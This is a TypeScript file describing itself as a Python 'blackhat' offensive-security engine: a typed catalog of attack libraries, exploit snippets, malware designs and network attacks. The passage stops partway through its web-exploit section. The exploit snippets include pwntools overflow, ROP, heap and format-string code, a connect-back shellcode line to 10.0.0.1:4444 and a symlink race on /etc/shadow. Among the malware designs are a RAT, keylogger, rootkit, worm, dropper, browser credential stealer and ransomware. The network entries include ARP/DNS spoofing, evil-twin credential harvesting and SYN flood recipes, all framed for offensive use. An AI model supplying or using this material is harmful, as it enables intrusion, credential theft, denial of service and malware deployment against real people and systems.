/**
 * ╔═══════════════════════════════════════════════════════════════════════════════╗
 * ║                                                                             ║
 * ║          🐍  P Y T H O N   B L A C K H A T   E N G I N E                   ║
 * ║                                                                             ║
 * ║   Comprehensive Python offensive security knowledge engine:                  ║
 * ║     recon → exploit → persist → escalate → exfiltrate → evade               ║
 * ║                                                                             ║
 * ║     • Python exploit development (pwntools, ROP, shellcode, heap)           ║
 * ║     • Python malware engineering (RATs, keyloggers, rootkits, implants)     ║
 * ║     • Python network attacks (ARP/DNS spoof, MITM, WiFi, injection)         ║
 * ║     • Python web exploitation (SQLi, XSS, SSRF, SSTI, web shells)          ║
 * ║     • Python reverse engineering (binary analysis, disasm, debugging)        ║
 * ║     • Python cryptographic attacks (hash crack, cipher, passwords)           ║
 * ║     • Python reconnaissance (OSINT, scanning, enum, fingerprint)            ║
 * ║     • Python privilege escalation (Linux/Windows, kernel exploits)           ║
 * ║     • Python C2 frameworks (covert channels, DNS tunnel, HTTP C2)           ║
 * ║     • Python evasion & obfuscation (AV/EDR bypass, sandbox detect)          ║
 * ║     • Python forensics evasion (anti-forensics, log clear, timestomp)       ║
 * ║     • Python social engineering (phishing, credential harvest)               ║
 * ║                                                                             ║
 * ║   40+ Python libraries • 60+ attack techniques • 50+ tool templates         ║
 * ║   No external dependencies. Fully self-contained.                           ║
 * ╚═══════════════════════════════════════════════════════════════════════════════╝
 */

// ── Helpers ──────────────────────────────────────────────────────────────────

function round2(n: number): number { return Math.round(n * 100) / 100; }
function clamp(n: number, lo: number, hi: number): number { return Math.max(lo, Math.min(hi, n)); }
function genId(prefix: string): string { return `${prefix}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`; }

// ── Types ────────────────────────────────────────────────────────────────────

export interface PythonBlackHatConfig {
  maxTools: number;
  enableExploitDev: boolean;
  enableMalware: boolean;
  enableNetworkAttacks: boolean;
  enableWebExploitation: boolean;
  enableReverseEngineering: boolean;
  enableCryptoAttacks: boolean;
  enableRecon: boolean;
  enablePrivEsc: boolean;
  enableC2: boolean;
  enableEvasion: boolean;
  enableForensicsEvasion: boolean;
  enableSocialEngineering: boolean;
}

export interface PythonBlackHatStats {
  totalToolsGenerated: number;
  totalExploitsCreated: number;
  totalAttacksCrafted: number;
  totalReconScans: number;
  totalMalwareSamples: number;
  totalEvasionTechniques: number;
  totalC2Configs: number;
  totalPrivEscPaths: number;
  totalLookups: number;
  feedbackCount: number;
}

export type AttackDomain =
  | 'exploit_dev' | 'malware' | 'network_attack' | 'web_exploitation'
  | 'reverse_engineering' | 'crypto_attack' | 'reconnaissance'
  | 'privilege_escalation' | 'c2_framework' | 'evasion'
  | 'forensics_evasion' | 'social_engineering';

export type Difficulty = 'beginner' | 'intermediate' | 'advanced' | 'expert';
export type TargetOS = 'linux' | 'windows' | 'macos' | 'cross_platform';

export interface PythonTool {
  id: string;
  name: string;
  domain: AttackDomain;
  description: string;
  pythonLibraries: string[];
  codeTemplate: string;
  difficulty: Difficulty;
  targetOS: TargetOS;
  mitreTechnique: string;
  stealthRating: number;
  reliability: number;
  prerequisites: string[];
  detection: string[];
  countermeasures: string[];
}

export interface PythonLibraryProfile {
  name: string;
  pipPackage: string;
  domain: AttackDomain;
  description: string;
  keyFeatures: string[];
  commonUseCases: string[];
  version: string;
  dependencies: string[];
}

export interface ExploitDevTechnique {
  id: string;
  name: string;
  category: 'buffer_overflow' | 'rop_chain' | 'heap_exploit' | 'format_string' | 'shellcode' | 'kernel_exploit' | 'fuzzing' | 'race_condition';
  description: string;
  pythonCode: string;
  libraries: string[];
  difficulty: Difficulty;
  platform: TargetOS;
}

export interface MalwareTechnique {
  id: string;
  name: string;
  category: 'rat' | 'keylogger' | 'rootkit' | 'backdoor' | 'ransomware_sim' | 'worm' | 'dropper' | 'implant' | 'stealer' | 'botnet_agent';
  description: string;
  pythonApproach: string;
  libraries: string[];
  capabilities: string[];
  evasionFeatures: string[];
  difficulty: Difficulty;
}

export interface NetworkAttack {
  id: string;
  name: string;
  category: 'arp_spoof' | 'dns_spoof' | 'mitm' | 'wifi_attack' | 'packet_injection' | 'dos' | 'dhcp_attack' | 'vlan_hopping' | 'sniffing' | 'tunnel';
  description: string;
  pythonApproach: string;
  libraries: string[];
  targetLayer: 'layer2' | 'layer3' | 'layer4' | 'layer7' | 'wireless';
  difficulty: Difficulty;
}

export interface WebExploit {
  id: string;
  name: string;
  category: 'sqli' | 'xss' | 'ssrf' | 'ssti' | 'lfi_rfi' | 'rce' | 'auth_bypass' | 'xxe' | 'deserialization' | 'api_abuse' | 'web_shell';
  description: string;
  pythonApproach: string;
  libraries: string[];
  owaspCategory: string;
  difficulty: Difficulty;
}

export interface PrivEscPath {
  id: string;
  name: string;
  platform: TargetOS;
  category: 'suid' | 'sudo' | 'kernel' | 'cron' | 'capabilities' | 'service' | 'registry' | 'token' | 'dll_hijack' | 'path_hijack' | 'unquoted_service';
  description: string;
  pythonApproach: string;
  prerequisites: string[];
  successRate: number;
}

export interface C2Config {
  id: string;
  name: string;
  protocol: 'http' | 'https' | 'dns' | 'icmp' | 'websocket' | 'smtp' | 'custom_tcp' | 'p2p' | 'cloud_api' | 'social_media';
  description: string;
  pythonApproach: string;
  libraries: string[];
  stealthRating: number;
  features: string[];
}

export interface EvasionMethod {
  id: string;
  name: string;
  category: 'av_bypass' | 'edr_bypass' | 'sandbox_detect' | 'amsi_bypass' | 'etw_bypass' | 'obfuscation' | 'packing' | 'process_hollowing' | 'unhooking' | 'timestomping';
  description: string;
  pythonApproach: string;
  targetDefense: string;
  effectiveness: number;
}

export interface ReconTechnique {
  id: string;
  name: string;
  category: 'port_scan' | 'osint' | 'subdomain_enum' | 'dns_enum' | 'web_fingerprint' | 'email_harvest' | 'social_recon' | 'vuln_scan' | 'network_map' | 'service_enum';
  description: string;
  pythonApproach: string;
  libraries: string[];
  passiveOrActive: 'passive' | 'active';
  difficulty: Difficulty;
}

// ── Default Config ───────────────────────────────────────────────────────────

export const DEFAULT_PYTHON_BLACKHAT_CONFIG: PythonBlackHatConfig = {
  maxTools: 200,
  enableExploitDev: true,
  enableMalware: true,
  enableNetworkAttacks: true,
  enableWebExploitation: true,
  enableReverseEngineering: true,
  enableCryptoAttacks: true,
  enableRecon: true,
  enablePrivEsc: true,
  enableC2: true,
  enableEvasion: true,
  enableForensicsEvasion: true,
  enableSocialEngineering: true,
};

// ── Private Builders ─────────────────────────────────────────────────────────

function buildPythonLibraries(): PythonLibraryProfile[] {
  const db: PythonLibraryProfile[] = [];
  const add = (l: PythonLibraryProfile) => { db.push(l); };

  // Core offensive libraries
  add({ name: 'pwntools', pipPackage: 'pwntools', domain: 'exploit_dev', description: 'CTF and binary exploitation framework with ELF/ROP/shellcraft support', keyFeatures: ['ROP chain building', 'Shellcode generation', 'ELF parsing', 'GDB integration', 'Remote/local process I/O', 'Format string automation'], commonUseCases: ['Buffer overflow exploitation', 'ROP chain construction', 'Shellcode crafting', 'CTF challenges'], version: '4.12', dependencies: ['capstone', 'unicorn', 'paramiko'] });
  add({ name: 'scapy', pipPackage: 'scapy', domain: 'network_attack', description: 'Powerful interactive packet manipulation library', keyFeatures: ['Packet crafting', 'Protocol dissection', 'Network scanning', 'Wireless attacks', 'ARP spoofing', 'DNS manipulation'], commonUseCases: ['ARP spoofing', 'Packet sniffing', 'Network reconnaissance', 'Protocol analysis'], version: '2.5', dependencies: [] });
  add({ name: 'impacket', pipPackage: 'impacket', domain: 'network_attack', description: 'Collection of Python classes for working with network protocols', keyFeatures: ['SMB/NTLM authentication', 'Kerberos attacks', 'DCOM/WMI execution', 'DCE/RPC', 'LDAP operations', 'MSSQL client'], commonUseCases: ['Pass-the-hash attacks', 'Kerberoasting', 'DCSync attacks', 'Remote command execution'], version: '0.11', dependencies: ['pycryptodomex', 'ldap3'] });
  add({ name: 'paramiko', pipPackage: 'paramiko', domain: 'network_attack', description: 'SSHv2 protocol implementation for Python', keyFeatures: ['SSH client/server', 'SFTP operations', 'SSH tunneling', 'Key management', 'Agent forwarding'], commonUseCases: ['SSH brute forcing', 'SSH tunneling', 'Remote command execution', 'SFTP file transfer'], version: '3.4', dependencies: ['bcrypt', 'cryptography'] });
  add({ name: 'requests', pipPackage: 'requests', domain: 'web_exploitation', description: 'HTTP library for Python with session management', keyFeatures: ['Session cookies', 'Proxy support', 'SSL/TLS handling', 'Multipart upload', 'Authentication'], commonUseCases: ['Web scraping', 'API exploitation', 'HTTP fuzzing', 'Session hijacking'], version: '2.31', dependencies: ['urllib3', 'certifi'] });
  add({ name: 'beautifulsoup4', pipPackage: 'beautifulsoup4', domain: 'reconnaissance', description: 'HTML/XML parsing library for web scraping', keyFeatures: ['HTML parsing', 'CSS selectors', 'Tag navigation', 'Search/filter', 'Encoding detection'], commonUseCases: ['Web scraping', 'Data extraction', 'OSINT gathering', 'Content analysis'], version: '4.12', dependencies: ['lxml', 'html5lib'] });
  add({ name: 'sqlmap', pipPackage: 'sqlmap', domain: 'web_exploitation', description: 'Automatic SQL injection and database takeover tool', keyFeatures: ['Blind SQLi', 'UNION-based SQLi', 'Time-based SQLi', 'Error-based SQLi', 'Database fingerprint', 'OS shell'], commonUseCases: ['SQL injection automation', 'Database extraction', 'OS command execution', 'File read/write'], version: '1.7', dependencies: [] });
  add({ name: 'pycryptodome', pipPackage: 'pycryptodome', domain: 'crypto_attack', description: 'Self-contained Python package for cryptographic recipes', keyFeatures: ['AES/DES/RSA', 'Hash functions', 'MACs', 'Key derivation', 'Random number generation', 'PKCS padding'], commonUseCases: ['Encrypted communications', 'Hash cracking helpers', 'Cryptographic analysis', 'Secure payload encryption'], version: '3.19', dependencies: [] });
  add({ name: 'angr', pipPackage: 'angr', domain: 'reverse_engineering', description: 'Platform-agnostic binary analysis framework with symbolic execution', keyFeatures: ['Symbolic execution', 'Binary lifting (VEX IR)', 'Control flow analysis', 'Constraint solving', 'Auto-exploit generation', 'CFG recovery'], commonUseCases: ['Binary analysis', 'Vulnerability discovery', 'Automatic exploit generation', 'CTF reverse engineering'], version: '9.2', dependencies: ['claripy', 'archinfo', 'cle'] });
  add({ name: 'volatility3', pipPackage: 'volatility3', domain: 'forensics_evasion', description: 'Memory forensics framework for incident response', keyFeatures: ['Memory dump analysis', 'Process listing', 'DLL extraction', 'Network connections', 'Registry hives', 'Malware detection'], commonUseCases: ['Memory forensics', 'Malware analysis', 'Incident response', 'Anti-forensics research'], version: '2.5', dependencies: ['yara-python', 'pefile'] });
  add({ name: 'frida', pipPackage: 'frida-tools', domain: 'reverse_engineering', description: 'Dynamic instrumentation toolkit for developers and security researchers', keyFeatures: ['Process injection', 'Function hooking', 'Memory manipulation', 'JavaScript engine', 'Cross-platform', 'API tracing'], commonUseCases: ['Runtime analysis', 'API hooking', 'Anti-tamper bypass', 'Mobile app testing'], version: '16.1', dependencies: [] });
  add({ name: 'capstone', pipPackage: 'capstone', domain: 'reverse_engineering', description: 'Lightweight multi-arch disassembly framework', keyFeatures: ['x86/x64 disasm', 'ARM/ARM64', 'MIPS', 'PowerPC', 'Instruction details', 'Python bindings'], commonUseCases: ['Binary disassembly', 'Shellcode analysis', 'Gadget finding', 'Code analysis'], version: '5.0', dependencies: [] });
  add({ name: 'keystone-engine', pipPackage: 'keystone-engine', domain: 'exploit_dev', description: 'Lightweight multi-arch assembler framework', keyFeatures: ['x86/x64 assembly', 'ARM/ARM64', 'Multi-syntax', 'Python bindings'], commonUseCases: ['Shellcode assembly', 'Instruction patching', 'Exploit development'], version: '0.9', dependencies: [] });
  add({ name: 'unicorn', pipPackage: 'unicorn', domain: 'reverse_engineering', description: 'Lightweight multi-arch CPU emulator framework', keyFeatures: ['CPU emulation', 'Hook callbacks', 'Memory mapping', 'Multi-arch support'], commonUseCases: ['Code emulation', 'Unpacking', 'Malware analysis', 'Fuzzing'], version: '2.0', dependencies: [] });
  add({ name: 'ropper', pipPackage: 'ropper', domain: 'exploit_dev', description: 'Display information about files in different formats and find ROP gadgets', keyFeatures: ['ROP gadget search', 'JOP gadgets', 'Semantic search', 'Chain building', 'Multi-format support'], commonUseCases: ['ROP chain building', 'Gadget discovery', 'Exploit development'], version: '1.13', dependencies: ['capstone', 'filebytes'] });
  add({ name: 'z3-solver', pipPackage: 'z3-solver', domain: 'reverse_engineering', description: 'Microsoft Z3 theorem prover and SMT solver', keyFeatures: ['SMT solving', 'Constraint solving', 'Symbolic execution support', 'Bit-vector operations'], commonUseCases: ['Keygen solving', 'Constraint solving in RE', 'Symbolic execution'], version: '4.12', dependencies: [] });
  add({ name: 'mitmproxy', pipPackage: 'mitmproxy', domain: 'network_attack', description: 'Interactive HTTPS proxy for penetration testers', keyFeatures: ['HTTP/HTTPS interception', 'Flow modification', 'Scripting API', 'WebSocket support', 'Certificate handling'], commonUseCases: ['MITM attacks', 'Traffic analysis', 'API testing', 'SSL inspection'], version: '10.1', dependencies: ['cryptography', 'h2'] });
  add({ name: 'dnspython', pipPackage: 'dnspython', domain: 'reconnaissance', description: 'DNS toolkit for Python supporting all record types', keyFeatures: ['DNS queries', 'Zone transfer', 'DNSSEC', 'Dynamic updates', 'All record types'], commonUseCases: ['DNS enumeration', 'DNS tunneling', 'Zone transfer attacks', 'DNS reconnaissance'], version: '2.4', dependencies: [] });
  add({ name: 'ldap3', pipPackage: 'ldap3', domain: 'network_attack', description: 'Strictly RFC 4510 conforming LDAP V3 client library', keyFeatures: ['LDAP bind', 'Search/filter', 'Modify operations', 'SSL/TLS', 'SASL authentication'], commonUseCases: ['AD enumeration', 'LDAP injection', 'User enumeration', 'Password spraying'], version: '2.9', dependencies: [] });
  add({ name: 'python-nmap', pipPackage: 'python-nmap', domain: 'reconnaissance', description: 'Python wrapper for nmap port scanning', keyFeatures: ['Port scanning', 'Service detection', 'OS fingerprint', 'NSE scripts', 'XML parsing'], commonUseCases: ['Port scanning', 'Network mapping', 'Service enumeration', 'Vulnerability scanning'], version: '0.7', dependencies: [] });
  add({ name: 'hashcat-utils', pipPackage: 'hashcat', domain: 'crypto_attack', description: 'Password recovery utilities and hash manipulation', keyFeatures: ['Hash identification', 'Wordlist generation', 'Rule-based attacks', 'Mask attacks'], commonUseCases: ['Password cracking preparation', 'Hash analysis', 'Wordlist management'], version: '6.2', dependencies: [] });
  add({ name: 'yara-python', pipPackage: 'yara-python', domain: 'evasion', description: 'YARA pattern matching for malware research', keyFeatures: ['Pattern matching', 'Rule compilation', 'Module support', 'Hex patterns', 'Regex support'], commonUseCases: ['Malware detection testing', 'Signature evasion', 'Threat hunting', 'IOC scanning'], version: '4.3', dependencies: [] });
  add({ name: 'pefile', pipPackage: 'pefile', domain: 'reverse_engineering', description: 'PE file parser for Windows executable analysis', keyFeatures: ['PE header parsing', 'Import/export tables', 'Section analysis', 'Resource extraction', 'Overlay detection'], commonUseCases: ['PE analysis', 'Malware analysis', 'Packer detection', 'Import reconstruction'], version: '2023.2', dependencies: [] });
  add({ name: 'selenium', pipPackage: 'selenium', domain: 'social_engineering', description: 'Browser automation for web testing and automation', keyFeatures: ['Browser control', 'JavaScript execution', 'Form filling', 'Screenshot capture', 'Cookie management'], commonUseCases: ['Credential harvesting', 'Automated phishing', 'Web scraping', 'Browser fingerprinting'], version: '4.15', dependencies: ['urllib3'] });

  return db;
}

function buildExploitDevTechniques(): ExploitDevTechnique[] {
  const db: ExploitDevTechnique[] = [];
  const add = (t: ExploitDevTechnique) => { db.push(t); };

  add({ id: 'pyexp-bof-pwntools', name: 'Buffer Overflow with pwntools', category: 'buffer_overflow', description: 'Stack buffer overflow exploitation using pwntools ELF parsing, pattern_create for offset finding, and p64 packing for RIP control', pythonCode: 'from pwn import *; elf = ELF("./vuln"); p = process(elf.path); offset = cyclic_find(core.fault_addr); payload = flat(cyclic(offset), elf.sym["win"]); p.sendline(payload)', libraries: ['pwntools'], difficulty: 'intermediate', platform: 'linux' });
  add({ id: 'pyexp-rop-chain', name: 'ROP Chain Construction', category: 'rop_chain', description: 'Automated ROP chain building with pwntools ROP class — pop_rdi gadgets, ret2libc, ret2system with ASLR leak', pythonCode: 'from pwn import *; elf = ELF("./vuln"); rop = ROP(elf); rop.call("puts", [elf.got["puts"]]); rop.call(elf.sym["main"]); payload = flat(cyclic(offset), rop.chain())', libraries: ['pwntools', 'ropper'], difficulty: 'advanced', platform: 'linux' });
  add({ id: 'pyexp-heap-tcache', name: 'Tcache Poisoning Attack', category: 'heap_exploit', description: 'Exploit glibc tcache bin to achieve arbitrary write — double-free in tcache, overwrite fd pointer, allocate at target address', pythonCode: 'alloc(0x20, "A"*8); alloc(0x20, "B"*8); free(0); free(1); free(0); alloc(0x20, p64(target_addr)); alloc(0x20, "C"); alloc(0x20, shellcode)', libraries: ['pwntools'], difficulty: 'expert', platform: 'linux' });
  add({ id: 'pyexp-fmt-string', name: 'Format String Exploitation', category: 'format_string', description: 'Automated format string attack with pwntools fmtstr_payload — overwrite GOT entries, leak stack values, chain writes', pythonCode: 'from pwn import *; p = process("./vuln"); p.sendline(b"%p."*20); leak = p.recvline(); payload = fmtstr_payload(offset, {elf.got["printf"]: elf.sym["win"]})', libraries: ['pwntools'], difficulty: 'advanced', platform: 'linux' });
  add({ id: 'pyexp-shellcraft', name: 'Shellcode with shellcraft', category: 'shellcode', description: 'Multi-architecture shellcode generation using pwntools shellcraft — execve, connect-back, staged payloads with encoders', pythonCode: 'from pwn import *; context.arch = "amd64"; sc = shellcraft.sh(); payload = asm(sc); # or shellcraft.connect("10.0.0.1", 4444) + shellcraft.dupsh()', libraries: ['pwntools', 'keystone-engine'], difficulty: 'intermediate', platform: 'linux' });
  add({ id: 'pyexp-kernel', name: 'Kernel Exploit Development', category: 'kernel_exploit', description: 'Linux kernel exploitation using Python — struct packing for ioctl, /dev interaction, commit_creds(prepare_kernel_cred(0)) ROP', pythonCode: 'import struct, ctypes; fd = os.open("/dev/vuln", os.O_RDWR); payload = struct.pack("<Q", kaslr_base + commit_creds_offset); os.ioctl(fd, IOCTL_CODE, payload)', libraries: ['pwntools', 'ctypes'], difficulty: 'expert', platform: 'linux' });
  add({ id: 'pyexp-fuzzing', name: 'Protocol Fuzzing with boofuzz', category: 'fuzzing', description: 'Network protocol fuzzing with boofuzz — session-based fuzzing, block definitions, callbacks, crash detection', pythonCode: 'from boofuzz import *; session = Session(target=Target(connection=TCPSocketConnection("target", 80))); s_initialize("HTTP"); s_string("GET"); s_delim(" "); s_string("/index.html"); session.connect(s_get("HTTP")); session.fuzz()', libraries: ['boofuzz'], difficulty: 'intermediate', platform: 'cross_platform' });
  add({ id: 'pyexp-race', name: 'Race Condition Exploitation', category: 'race_condition', description: 'TOCTOU race condition exploitation with Python threading — symlink races, file race attacks, concurrent request flooding', pythonCode: 'import threading, os; def racer(): while True: os.symlink("/etc/shadow", "/tmp/target"); os.unlink("/tmp/target"); threads = [threading.Thread(target=racer) for _ in range(10)]; [t.start() for t in threads]', libraries: ['threading'], difficulty: 'advanced', platform: 'linux' });

  return db;
}

function buildMalwareTechniques(): MalwareTechnique[] {
  const db: MalwareTechnique[] = [];
  const add = (t: MalwareTechnique) => { db.push(t); };

  add({ id: 'pymal-rat', name: 'Python Remote Access Trojan', category: 'rat', description: 'Full-featured RAT with reverse shell, file transfer, screenshot, keylogging, and persistence — multi-threaded C2 communication', pythonApproach: 'Socket-based reverse connection with command dispatcher, subprocess execution, file operations, and encrypted communication channel using AES', libraries: ['socket', 'subprocess', 'threading', 'pycryptodome'], capabilities: ['reverse_shell', 'file_transfer', 'screenshot', 'keylog', 'persistence', 'process_list'], evasionFeatures: ['encrypted_comms', 'anti_vm', 'process_injection'], difficulty: 'advanced' });
  add({ id: 'pymal-keylogger', name: 'Python Keylogger', category: 'keylogger', description: 'Cross-platform keylogger with pynput — captures keystrokes, clipboard, active window titles, and periodic exfiltration via email/HTTP', pythonApproach: 'pynput.keyboard.Listener for keystroke capture, win32gui for active window tracking, periodic batched exfiltration with encryption', libraries: ['pynput', 'win32gui', 'smtplib'], capabilities: ['keystroke_capture', 'clipboard_monitor', 'window_tracking', 'timed_exfil'], evasionFeatures: ['startup_persistence', 'hidden_process', 'encrypted_logs'], difficulty: 'intermediate' });
  add({ id: 'pymal-rootkit', name: 'Python User-Space Rootkit', category: 'rootkit', description: 'LD_PRELOAD-based rootkit that hooks libc functions — hides files, processes, network connections from system tools', pythonApproach: 'ctypes to load custom shared library via LD_PRELOAD, hooking readdir/stat/open to filter results, hiding by PID/filename patterns', libraries: ['ctypes', 'os'], capabilities: ['file_hiding', 'process_hiding', 'network_hiding', 'log_tampering'], evasionFeatures: ['ld_preload_hook', 'syscall_interception'], difficulty: 'expert' });
  add({ id: 'pymal-backdoor', name: 'Python Encrypted Backdoor', category: 'backdoor', description: 'Encrypted reverse shell backdoor with AES-256-CBC — survives reboots via cron/registry, multi-stage payload delivery', pythonApproach: 'AES encrypted socket communication, subprocess shell execution, base64 encoded commands, multi-platform persistence installation', libraries: ['pycryptodome', 'socket', 'subprocess'], capabilities: ['encrypted_shell', 'file_operations', 'persistence', 'self_destruct'], evasionFeatures: ['aes_encryption', 'base64_encoding', 'anti_debug'], difficulty: 'advanced' });
  add({ id: 'pymal-ransomware-sim', name: 'Ransomware Simulator', category: 'ransomware_sim', description: 'Educational ransomware simulation — AES file encryption, RSA key exchange, file enumeration, extension targeting (SIMULATION ONLY)', pythonApproach: 'Walk directory tree targeting extensions, generate per-file AES key, encrypt AES key with RSA public key, rename files with .encrypted extension', libraries: ['pycryptodome', 'os', 'glob'], capabilities: ['file_encryption', 'key_exchange', 'extension_filter', 'ransom_note'], evasionFeatures: ['in_memory_keys', 'secure_deletion'], difficulty: 'advanced' });
  add({ id: 'pymal-worm', name: 'Python Network Worm', category: 'worm', description: 'Self-propagating worm using SSH/SMB — scans subnet, attempts credential stuffing, copies and executes on new hosts', pythonApproach: 'Subnet scanning with socket, paramiko SSH brute force or impacket SMB, SCP self-copy to new host, cron-based persistence on propagated hosts', libraries: ['paramiko', 'impacket', 'socket', 'threading'], capabilities: ['self_propagation', 'subnet_scan', 'credential_stuffing', 'auto_execution'], evasionFeatures: ['random_sleep', 'hostname_check', 'rate_limiting'], difficulty: 'expert' });
  add({ id: 'pymal-dropper', name: 'Python Payload Dropper', category: 'dropper', description: 'Multi-stage dropper — downloads encrypted payload, decrypts in memory, executes via process injection or exec()', pythonApproach: 'HTTP/DNS download of encrypted blob, AES decrypt in memory, exec() or ctypes VirtualAlloc/WriteProcessMemory injection, cleanup', libraries: ['requests', 'pycryptodome', 'ctypes'], capabilities: ['staged_delivery', 'in_memory_exec', 'payload_encryption', 'dropper_cleanup'], evasionFeatures: ['memory_only', 'encrypted_payload', 'anti_sandbox'], difficulty: 'advanced' });
  add({ id: 'pymal-stealer', name: 'Python Credential Stealer', category: 'stealer', description: 'Browser credential and cookie extractor — SQLite DB parsing for Chrome/Firefox, DPAPI decryption, cookie extraction', pythonApproach: 'Locate browser profile SQLite databases, extract login_data/cookies, decrypt with DPAPI (Windows) or NSS (Linux), exfiltrate via HTTP POST', libraries: ['sqlite3', 'ctypes', 'win32crypt'], capabilities: ['browser_passwords', 'browser_cookies', 'saved_forms', 'history_extraction'], evasionFeatures: ['in_memory_processing', 'encrypted_exfil'], difficulty: 'intermediate' });
  add({ id: 'pymal-botnet', name: 'Python Botnet Agent', category: 'botnet_agent', description: 'IRC/HTTP-based botnet agent — receives commands from C2, executes tasks, reports results, supports DDoS/spam/mining modules', pythonApproach: 'IRC or HTTP polling C2 communication, command parsing and dispatch, module loading for attack types, health reporting', libraries: ['socket', 'irc', 'requests', 'threading'], capabilities: ['command_execution', 'ddos_module', 'spam_module', 'update_module', 'self_destruct'], evasionFeatures: ['domain_generation', 'encrypted_c2', 'anti_analysis'], difficulty: 'advanced' });
  add({ id: 'pymal-implant', name: 'Python Memory-Only Implant', category: 'implant', description: 'Fileless implant that runs entirely in memory — no disk artifacts, code loaded via network, executes via exec/ctypes', pythonApproach: 'Receive code over encrypted channel, compile and exec() in memory, never write to disk, use memfd_create on Linux for execution', libraries: ['ctypes', 'socket', 'code'], capabilities: ['fileless_execution', 'dynamic_loading', 'memory_only', 'reflective_load'], evasionFeatures: ['no_disk_write', 'encrypted_channel', 'memory_cleanup'], difficulty: 'expert' });

  return db;
}

function buildNetworkAttacks(): NetworkAttack[] {
  const db: NetworkAttack[] = [];
  const add = (a: NetworkAttack) => { db.push(a); };

  add({ id: 'pynet-arp-spoof', name: 'ARP Cache Poisoning', category: 'arp_spoof', description: 'Send crafted ARP replies to associate attacker MAC with gateway IP — redirect traffic through attacker for MITM', pythonApproach: 'Scapy ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway) sent in loop, enable IP forwarding, restore on exit', libraries: ['scapy'], targetLayer: 'layer2', difficulty: 'intermediate' });
  add({ id: 'pynet-dns-spoof', name: 'DNS Spoofing Attack', category: 'dns_spoof', description: 'Intercept DNS queries and respond with forged DNS replies pointing to attacker-controlled IP addresses', pythonApproach: 'Scapy sniff DNS queries with BPF filter, craft DNS response with spoofed IP, use NetfilterQueue or raw sockets for inline modification', libraries: ['scapy', 'netfilterqueue'], targetLayer: 'layer7', difficulty: 'advanced' });
  add({ id: 'pynet-mitm-proxy', name: 'Man-in-the-Middle Proxy', category: 'mitm', description: 'Full MITM proxy that intercepts, modifies, and forwards HTTP/HTTPS traffic — SSL stripping, content injection, credential capture', pythonApproach: 'mitmproxy scripting API with request/response hooks, SSL certificate generation, content injection via flow modification, credential extraction', libraries: ['mitmproxy', 'scapy'], targetLayer: 'layer7', difficulty: 'advanced' });
  add({ id: 'pynet-wifi-deauth', name: 'WiFi Deauthentication Attack', category: 'wifi_attack', description: 'Send 802.11 deauthentication frames to disconnect clients from access point — prerequisite for evil twin or handshake capture', pythonApproach: 'Scapy Dot11Deauth with RadioTap header, target specific BSSID/client or broadcast, set interface to monitor mode first', libraries: ['scapy'], targetLayer: 'wireless', difficulty: 'intermediate' });
  add({ id: 'pynet-wifi-evil-twin', name: 'Evil Twin Access Point', category: 'wifi_attack', description: 'Create rogue access point mimicking legitimate WiFi — captive portal for credential harvesting, traffic interception', pythonApproach: 'hostapd configuration via Python, dnsmasq for DHCP, iptables for routing, Flask captive portal for credential capture', libraries: ['scapy', 'flask', 'subprocess'], targetLayer: 'wireless', difficulty: 'advanced' });
  add({ id: 'pynet-packet-inject', name: 'Raw Packet Injection', category: 'packet_injection', description: 'Craft and inject arbitrary packets at any layer — TCP RST injection, SYN flooding, custom protocol packets', pythonApproach: 'Scapy IP()/TCP()/Raw() packet construction, send() for layer 3, sendp() for layer 2, sr1() for send-receive pairs', libraries: ['scapy'], targetLayer: 'layer3', difficulty: 'intermediate' });
  add({ id: 'pynet-syn-flood', name: 'SYN Flood Attack', category: 'dos', description: 'TCP SYN flood denial of service — exhaust server connection table with half-open connections from spoofed IPs', pythonApproach: 'Scapy IP(src=RandIP())/TCP(dport=target_port, flags="S") in rapid loop, randomize source IP and port', libraries: ['scapy'], targetLayer: 'layer4', difficulty: 'beginner' });
  add({ id: 'pynet-dhcp-starve', name: 'DHCP Starvation Attack', category: 'dhcp_attack', description: 'Exhaust DHCP server IP pool by requesting all available addresses with spoofed MAC addresses', pythonApproach: 'Scapy DHCP Discover with random chaddr MAC in loop, consume entire IP pool, then deploy rogue DHCP server', libraries: ['scapy'], targetLayer: 'layer3', difficulty: 'intermediate' });
  add({ id: 'pynet-vlan-hop', name: 'VLAN Hopping via DTP', category: 'vlan_hopping', description: 'Exploit Cisco DTP to negotiate trunk port and access multiple VLANs — double-tagging for cross-VLAN access', pythonApproach: 'Scapy Dot1Q double-tagging with native VLAN outer tag, target VLAN inner tag, or craft DTP frames to enable trunking', libraries: ['scapy'], targetLayer: 'layer2', difficulty: 'advanced' });
  add({ id: 'pynet-sniff-creds', name: 'Credential Sniffing', category: 'sniffing', description: 'Passive packet capture and credential extraction from unencrypted protocols — FTP, HTTP Basic, SMTP, POP3, Telnet', pythonApproach: 'Scapy sniff() with BPF filter for specific ports, extract TCP payload, regex match for USER/PASS/Authorization headers', libraries: ['scapy'], targetLayer: 'layer7', difficulty: 'beginner' });
  add({ id: 'pynet-icmp-tunnel', name: 'ICMP Tunneling', category: 'tunnel', description: 'Encapsulate data within ICMP echo request/reply packets to bypass firewalls that allow ping', pythonApproach: 'Scapy IP()/ICMP(type=8)/Raw(data) for client, sniff ICMP and extract payload on server, bidirectional data channel', libraries: ['scapy'], targetLayer: 'layer3', difficulty: 'advanced' });
  add({ id: 'pynet-llmnr-poison', name: 'LLMNR/NBT-NS Poisoning', category: 'sniffing', description: 'Respond to LLMNR/NBT-NS broadcast name resolution queries with attacker IP — capture NTLMv2 hashes', pythonApproach: 'Sniff UDP 5355 (LLMNR) and 137 (NBT-NS), respond with attacker IP, relay captured NTLMv2 challenge/response to hashcat', libraries: ['scapy', 'impacket'], targetLayer: 'layer7', difficulty: 'intermediate' });

  return db;
}

function buildWebExploits(): WebExploit[] {
  const db: WebExploit[] = [];
  const add = (e: WebExploit) => { db.push(e); };

  add({ id: 'pyweb-sqli-auto', name: 'Automated SQL Injection', category: 'sqli', description: 'Python SQLi scanner — detect injection points, determine DB type, extract schema, dump tables using UNION/blind/time-based techniques', pythonApproach: 'requests with parameter fuzzing, detect SQL errors in response, automate UNION column enumeration, binary search for blind SQLi extraction', libraries: ['requests', 'sqlmap'], owaspCategory: 'A03:2021-Injection', difficulty: 'intermediate' });
